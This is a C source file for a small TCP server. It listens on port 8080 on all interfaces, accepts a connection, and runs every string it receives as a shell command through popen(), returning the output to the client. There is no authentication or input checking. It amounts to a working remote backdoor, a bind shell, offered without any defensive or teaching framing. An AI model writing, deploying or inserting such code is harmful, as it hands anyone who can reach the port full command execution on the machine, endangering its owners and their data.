#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 8080
#define BUFFER_SIZE 1024

int main()
{
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size;
    char buffer[BUFFER_SIZE];

    // Create socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0)
    {
        perror("Error in socket creation");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind the socket
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("Error in binding");
        exit(1);
    }

    // Listen for incoming connections
    if (listen(server_socket, 10) == 0)
    {
        printf("Server listening on port %d...\n", PORT);
    }
    else
    {
        perror("Error in listening");
        exit(1);
    }

    addr_size = sizeof(client_addr);
    client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &addr_size);

    while (1)
    {
        memset(buffer, 0, sizeof(buffer));
        recv(client_socket, buffer, sizeof(buffer), 0);

        if (strcmp(buffer, "exit") == 0)
        {
            printf("Server exiting...\n");
            break;
        }

        printf("Received command: %s\n", buffer);

        // Execute the command and send the result to the client
        FILE *command_output = popen(buffer, "r");
        if (command_output == NULL)
        {
            perror("Error executing the command");
            exit(1);
        }

        char command_result[BUFFER_SIZE];
        while (fgets(command_result, sizeof(command_result), command_output) != NULL)
        {
            send(client_socket, command_result, strlen(command_result), 0);
        }
        pclose(command_output);

        // Notify the client that the command execution is complete
        send(client_socket, "CMD_EXEC_COMPLETE", strlen("CMD_EXEC_COMPLETE"), 0);
    }

    close(client_socket);
    close(server_socket);
    return 0;
}